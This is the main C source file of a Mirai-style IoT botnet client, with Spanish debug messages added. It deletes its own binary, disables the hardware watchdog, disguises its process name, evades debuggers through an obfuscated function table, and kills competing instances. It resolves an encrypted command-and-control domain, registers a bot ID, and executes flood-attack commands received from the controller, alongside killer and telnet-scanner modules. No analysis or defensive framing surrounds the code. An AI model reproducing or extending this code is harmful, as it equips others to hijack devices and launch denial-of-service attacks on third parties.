#define _GNU_SOURCE

#define DEBUG 1
//#define DEBUG_LOG 1

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>

#include "includes.h"
#include "table.h"
#include "rand.h"
#include "attack.h"
#include "killer.h"
#include "scanner.h"
#include "util.h"
#include "resolv.h"

static void anti_gdb_entry(int);
static void resolve_cnc_addr(void);
static void establish_connection(void);
static void teardown_connection(void);
static void ensure_single_instance(void);
static BOOL unlock_tbl_if_nodebug(char *);

struct sockaddr_in srv_addr;
int fd_ctrl = -1, fd_serv = -1;
BOOL pending_connection = FALSE;
void (*resolve_func)(void) = (void (*)(void))util_local_addr; // Overridden in anti_gdb_entry

#ifdef DEBUG
static void segv_handler(int sig, siginfo_t *si, void *unused)
{
    printf("Got SIGSEGV at address: 0x%lx\n", (long)si->si_addr);
    exit(EXIT_FAILURE);
}
#endif

int main(int argc, char **args)
{
    printf("[main %d] ¡Ejecutando bot!\n", getpid());

    char *tbl_exec_succ;
    char name_buf[32];
    char id_buf[32];
    int name_buf_len;
    int tbl_exec_succ_len;
    int pgid, pings = 0;

#ifndef DEBUG
    sigset_t sigs;
    int wfd;

    // Delete self
    unlink(args[0]);

    // Signal based control flow
    sigemptyset(&sigs);
    sigaddset(&sigs, SIGINT);
    sigprocmask(SIG_BLOCK, &sigs, NULL);
    signal(SIGCHLD, SIG_IGN);
    signal(SIGTRAP, &anti_gdb_entry);

    // Prevent watchdog from rebooting device
    if ((wfd = open("/dev/watchdog", 2)) != -1 ||
        (wfd = open("/dev/misc/watchdog", 2)) != -1)
    {
        int one = 1;

        ioctl(wfd, 0x80045704, &one);
        close(wfd);
        wfd = 0;
    }
    chdir("/");
#endif

#ifdef DEBUG
    printf("DEBUG MODE YO\n");
    usleep(1000);

    struct sigaction sa;

    sa.sa_flags = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = segv_handler;
    if (sigaction(SIGSEGV, &sa, NULL) == -1)
        perror("sigaction");

    sa.sa_flags = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = segv_handler;
    if (sigaction(SIGBUS, &sa, NULL) == -1)
        perror("sigaction");
#endif

    LOCAL_ADDR = util_local_addr();

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
    srv_addr.sin_port = htons(FAKE_CNC_PORT);

#ifdef DEBUG
    unlock_tbl_if_nodebug(args[0]);
    anti_gdb_entry(0);
#else
    if (unlock_tbl_if_nodebug(args[0]))
        raise(SIGTRAP);
#endif

    ensure_single_instance();

    rand_init();

    util_zero(id_buf, 32);
    if (argc >= 2 && util_strlen(args[1]) < 32) {
        util_strcpy(id_buf, args[1]);
        util_zero(args[1], util_strlen(args[1]));
    } else {
        srand(time(NULL)); // Initialize random seed

        int jj;
        for (jj = 0; jj < 8; jj++) {
            int randomDigit = rand() % 16;
            id_buf[jj] = randomDigit + (randomDigit < 10 ? '0' : ('A' - 10));
        }
    }
    printf("id_buf: %s\n", id_buf);

    // Hide argv0
    name_buf_len = ((rand_next() % 4) + 3) * 4;
    rand_alphastr(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    util_strcpy(args[0], name_buf);

    // Hide process name
    name_buf_len = ((rand_next() % 6) + 3) * 4;
    rand_alphastr(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    prctl(PR_SET_NAME, name_buf);

    // Print out system exec
    table_unlock_val(TABLE_EXEC_SUCCESS);
    tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &tbl_exec_succ_len);
    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
    write(STDOUT, "\n", 1);
    table_lock_val(TABLE_EXEC_SUCCESS);

#ifndef DEBUG
    if (fork() > 0) {
        printf("[main %d] Exiting main program.\n", getpid());
        return 0;
    }

    printf("[main %d] Continuing with child process.\n", getpid());
    pgid = setsid();

    //printf("[main %d] Closing standard pipes.\n", getpid());
    //close(STDIN);
    //close(STDOUT);
    //close(STDERR);
#endif

    attack_init();
    killer_init();
#ifdef MIRAI_TELNET
#ifdef DEBUG_LOG
    printf("[main %d] Llamando a scanner_init()...\n", getpid());
#endif
    scanner_init();
#endif

    while (TRUE) {
        fd_set fdsetrd, fdsetwr, fdsetex;
        struct timeval timeo;
        int mfd, nfds;

        FD_ZERO(&fdsetrd);
        FD_ZERO(&fdsetwr);

        // Socket for accept()
        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);

        // Set up CNC sockets
        if (fd_serv == -1)
            establish_connection();

#ifdef DEBUG_LOG
            //printf("[main %d] Conectado a %s.\n", getpid(), inet_ntoa(srv_addr.sin_addr));
#endif

        if (pending_connection)
            FD_SET(fd_serv, &fdsetwr);
        else
            FD_SET(fd_serv, &fdsetrd);

        // Get maximum FD for select
        if (fd_ctrl > fd_serv)
            mfd = fd_ctrl;
        else
            mfd = fd_serv;

        // Wait 10s in call to select()
        timeo.tv_usec = 0;
        timeo.tv_sec = 10;
        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
        if (nfds == -1) {
#ifdef DEBUG_LOG
            printf("select() errno = %d\n", errno);
#endif
            continue;
        } else if (nfds == 0) {
            uint16_t len = 0;

            if (pings++ % 6 == 0)
                send(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
        }

        // Check if we need to kill ourselves
        if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd)) {
            struct sockaddr_in cli_addr;
            socklen_t cli_addr_len = sizeof(cli_addr);

            accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);

#ifdef DEBUG_LOG
            printf("[main %d] Detected newer instance running! Killing self...\n", getpid());
#endif
#ifdef MIRAI_TELNET
            scanner_kill();
#endif
            killer_kill();
            attack_kill_all();
            kill(pgid * -1, 9);
            exit(0);
        }

        // Check if CNC connection was established or timed out or errored
        if (pending_connection) {
            //printf("[main %d] pending_connection\n", getpid());

            pending_connection = FALSE;

            if (!FD_ISSET(fd_serv, &fdsetwr)) {
#ifdef DEBUG_LOG
                printf("[main %d] Timed out while connecting to CNC\n", getpid());
#endif
                teardown_connection();
            } else {
                int err = 0;
                socklen_t err_len = sizeof(err);

                getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err != 0) {
#ifdef DEBUG_LOG
                    printf("[main %d] Error while connecting to CNC code=%d\n", getpid(), err);
#endif
                    close(fd_serv);
                    fd_serv = -1;
                    sleep((rand_next() % 10) + 1);
                } else {
                    uint8_t id_len = util_strlen(id_buf);

                    //LOCAL_ADDR = util_local_addr();
#ifdef DEBUG_LOG
                    printf("[main %d] Enviando código de control para bots (0x00000001)...\n", getpid(), err);
#endif
                    send(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);
#ifdef DEBUG_LOG
                    printf("[main %d] Enviando longitud del bot ID (%u)...\n", getpid(), id_len);
#endif
                    send(fd_serv, &id_len, sizeof(id_len), MSG_NOSIGNAL);
                    if (id_len > 0) {
#ifdef DEBUG_LOG
                        printf("[main %d] Enviando el bot ID (%s)...\n", getpid(), id_buf);
#endif
                        send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
                    }
#ifdef DEBUG_LOG
                    struct in_addr addr;
                    addr.s_addr = (uint32_t)LOCAL_ADDR;
                    printf("[main %d] Connectado al CNC (%s)!\n", getpid(), inet_ntoa(srv_addr.sin_addr));
#endif
                }
            }
        } else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd)) {
read_from_cnc:
            //printf("[main %d] not pending_connection, readable\n", getpid());
            printf("");

            int n, jj;
            uint16_t len = 0;
            char rdbuf[1024];

            // Try to read in buffer length from CNC
#ifdef DEBUG_LOG
            //printf("[main %d] Trying to read buffer length from CNC...\n", getpid());
#endif
            errno = 0;
            n = recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL | MSG_WAITALL);
            //printf("[main %d] n: %d, len: %u\n", getpid(), n, ntohs(len));
            if (n == -1) {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;

                printf("errno: %d\n", errno);
                n = 0;
            }

            if (n == 0 || len == 0) {
#ifdef DEBUG_LOG
                //printf("[main %d] Nothing to read. Retry...\n", getpid());
#endif
                usleep(10000);
                goto read_from_cnc;
            } else {
#ifdef DEBUG_LOG
                //printf("[main %d] %d bytes read into len\n", getpid(), n);
#endif
            }

            len = ntohs(len) - n;
#ifdef DEBUG_LOG
            //printf("[main %d] len = ntohs(len): %u\n", getpid(), len);
#endif

            if (len > sizeof(rdbuf)) {
                close(fd_serv);
                fd_serv = -1;
            }

            // Try to read in buffer from CNC
#ifdef DEBUG_LOG
            //printf("[main %d] Trying to read buffer from CNC...\n", getpid());
#endif
            errno = 0;
            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_WAITALL);
            if (n == -1) {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            if (n == 0) {
#ifdef DEBUG_LOG
                printf("[main %d] Lost connection with CNC (errno = %d) 2\n", getpid(), errno);
#endif
                teardown_connection();
                continue;
            } else {
#ifdef DEBUG_LOG
                printf("[main %d] %d bytes read into rdbuf\n", getpid(), n);
                for (jj = 0; jj < n; jj++) printf("%u ", rdbuf[jj]);
                printf("\n");
#endif
            }

            if ((uint)n != len) {
                printf("[main %d] n (%d) and len (%u) do not match!\n", getpid(), n, len);
                abort();
            }

#ifdef DEBUG_LOG
            printf("[main %d] Received %d bytes from CNC\n", getpid(), len);
#endif

            if (len > 0)
                attack_parse(rdbuf, len);
        }
    }

    return 0;
}

static void anti_gdb_entry(int sig)
{
#ifdef DEBUG_LOG
    printf("[main %d] anti_gdb_entry()\n", getpid());
#endif
    resolve_func = resolve_cnc_addr;
}

static void resolve_cnc_addr(void)
{
#ifdef DEBUG_LOG
    printf("[main %d] Resolving CNC address...\n", getpid());
#endif

    int i;
    struct resolv_entries *entries;

    table_unlock_val(TABLE_CNC_DOMAIN);
    char *cnc_domain = table_retrieve_val(TABLE_CNC_DOMAIN, NULL);
    printf("[main %d] CNC domain: \"%s\":\n", getpid(), cnc_domain);
    entries = resolv_lookup(cnc_domain);
    table_lock_val(TABLE_CNC_DOMAIN);
    if (entries == NULL) {
#ifdef DEBUG_LOG
        printf("[main %d] Failed to resolve CNC address\n", getpid());
#endif
        return;
    }

    printf("CNC domain resolved to %d IP addresses:\n", entries->addrs_len);
    for (i = 0; i < entries->addrs_len; i++) {
        struct in_addr addr;
        addr.s_addr = (uint32_t)entries->addrs[i];
        printf("(%d) %s\n", i + 1, inet_ntoa(addr));
    }

    srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
    resolv_entries_free(entries);

    table_unlock_val(TABLE_CNC_PORT);
    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
    table_lock_val(TABLE_CNC_PORT);

#ifdef DEBUG_LOG
    printf("[main %d] Resolved domain\n", getpid());
#endif
}

static void establish_connection(void)
{
#ifdef DEBUG_LOG
    printf("[main %d] Attempting to connect to CNC...\n", getpid());
#endif

    if ((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG_LOG
        printf("[main %d] Failed to call socket(). Errno = %d\n", getpid(), errno);
#endif
        return;
    }

    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));

    // Should call resolve_cnc_addr
    if (resolve_func != NULL)
        resolve_func();

    pending_connection = TRUE;
    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in));
}

static void teardown_connection(void)
{
#ifdef DEBUG_LOG
    printf("[main %d] Tearing down connection to CNC!\n", getpid());
#endif

    if (fd_serv != -1)
        close(fd_serv);
    fd_serv = -1;
    sleep(1);
}

static void ensure_single_instance(void)
{
    static BOOL local_bind = TRUE;
    struct sockaddr_in addr;
    int opt = 1;

    if ((fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        return;
    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(int));
    fcntl(fd_ctrl, F_SETFL, O_NONBLOCK | fcntl(fd_ctrl, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = local_bind ? (INET_ADDR(127, 0, 0, 1)) : LOCAL_ADDR;
    addr.sin_port = htons(SINGLE_INSTANCE_PORT);

    // Try to bind to the control port
    errno = 0;
    if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) {
        if (errno == EADDRNOTAVAIL && local_bind)
            local_bind = FALSE;
#ifdef DEBUG_LOG
        printf("[main %d] Another instance is already running (errno = %d)! Sending kill request...\r\n", getpid(), errno);
#endif

        // Reset addr just in case
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(SINGLE_INSTANCE_PORT);

        if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) {
#ifdef DEBUG_LOG
            printf("[main %d] Failed to connect to fd_ctrl to request process termination\n", getpid());
#endif
        }

        sleep(2);
        close(fd_ctrl);
        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
        ensure_single_instance(); // Call again, so that we are now the control
    }
    else
    {
        if (listen(fd_ctrl, 1) == -1)
        {
#ifdef DEBUG_LOG
            printf("[main %d] Failed to call listen() on fd_ctrl\n", getpid());
            close(fd_ctrl);
            sleep(2);
            killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
            ensure_single_instance();
#endif
        }
#ifdef DEBUG_LOG
        printf("[main %d] We are the only process on this system!\n", getpid());
#endif
    }
}

static BOOL unlock_tbl_if_nodebug(char *argv0)
{
    // ./dvrHelper = 0x2e 0x2f 0x64 0x76 0x72 0x48 0x65 0x6c 0x70 0x65 0x72
    char buf_src[18] = {0x2f, 0x2e, 0x00, 0x76, 0x64, 0x00, 0x48, 0x72, 0x00, 0x6c, 0x65, 0x00, 0x65, 0x70, 0x00, 0x00, 0x72, 0x00}, buf_dst[12];
    int i, ii = 0, c = 0;
    uint8_t fold = 0xAF;
    void (*obf_funcs[])(void) = {
        (void (*)(void))ensure_single_instance,
        (void (*)(void))table_unlock_val,
        (void (*)(void))table_retrieve_val,
        (void (*)(void))table_init, // This is the function we actually want to run
        (void (*)(void))table_lock_val,
        (void (*)(void))util_memcpy,
        (void (*)(void))util_strcmp,
        (void (*)(void))killer_init,
        (void (*)(void))anti_gdb_entry};
    BOOL matches;

    for (i = 0; i < 7; i++)
        c += (long)obf_funcs[i];
    if (c == 0)
        return FALSE;

    // We swap every 2 bytes: e.g. 1, 2, 3, 4 -> 2, 1, 4, 3
    for (i = 0; i < sizeof(buf_src); i += 3)
    {
        char tmp = buf_src[i];

        buf_dst[ii++] = buf_src[i + 1];
        buf_dst[ii++] = tmp;

        // Meaningless tautology that gets you right back where you started
        i *= 2;
        i += 14;
        i /= 2;
        i -= 7;

        // Mess with 0xAF
        fold += ~argv0[ii % util_strlen(argv0)];
    }
    fold %= (sizeof(obf_funcs) / sizeof(void *));

#ifndef DEBUG
    (obf_funcs[fold])();
    matches = util_strcmp(argv0, buf_dst);
    util_zero(buf_src, sizeof(buf_src));
    util_zero(buf_dst, sizeof(buf_dst));
    return matches;
#else
    table_init();
    return TRUE;
#endif
}
